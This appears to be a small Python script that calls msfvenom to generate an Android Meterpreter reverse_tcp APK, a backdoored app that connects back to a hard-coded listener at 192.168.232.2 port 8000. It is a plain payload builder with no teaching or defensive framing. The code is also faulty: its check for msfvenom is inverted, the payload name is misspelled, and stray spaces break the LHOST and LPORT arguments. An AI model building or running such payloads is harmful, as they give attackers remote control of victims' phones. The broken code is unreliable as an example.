#!/usr/bin/env python3

import os
import sys
from shutil import which

def Is_meta_available(out_d):
    global ver_msf
    ver_msf= 10.2
    NAN = "None"
    print("\nRunning cammand\n")
    cmd = 'msfvenom -v'
    print(cmd)
    ver_msf = which("msfvenom")
    if (ver_msf is NAN):
        print("Msfvenom Available")
        Draw_payload_and(out_d)
    else:
        print("Msfvenom not Available")

def Draw_payload_and(o1):
    print("\nRunning cammand\n")
    cmd1 = 'msfvenom -p android/meterpeter/reverse_tcp LHOST= 192.168.232.2 LPORT= 8000 -o '+o1+'\MSF_'+str(ver_msf)+'.apk'
    os.system(cmd1)

if __name__ == '__main__':
    print("""\
#//////////////////////////////////////////
# Creating Metasploit paylod
#/////////////////////////////////////////
""")
    #if (len(sys.argv) != 2):
    #    print ("Provide output directory")
    #    exit(0)
    #out_dir= str(sys.argv[1])
    out_dir= r"D:\Done\DEX"
    Is_meta_available(out_dir)

